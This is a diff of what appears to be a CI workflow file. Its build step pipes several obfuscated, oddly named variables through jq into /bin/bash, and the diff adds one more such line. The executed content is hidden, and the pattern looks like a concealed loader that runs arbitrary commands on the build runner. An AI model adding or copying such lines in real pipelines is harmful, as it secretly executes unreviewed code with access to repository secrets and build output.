@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$ne97998" | jq -r .dlhon7088 | /bin/bash
           echo $ss13 | jq -r .k21 | /bin/bash
           echo $jkltp38567 | jq -r .q9636 | /bin/bash
+          printf '%s' "$j2" | jq -r .mtfq063 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
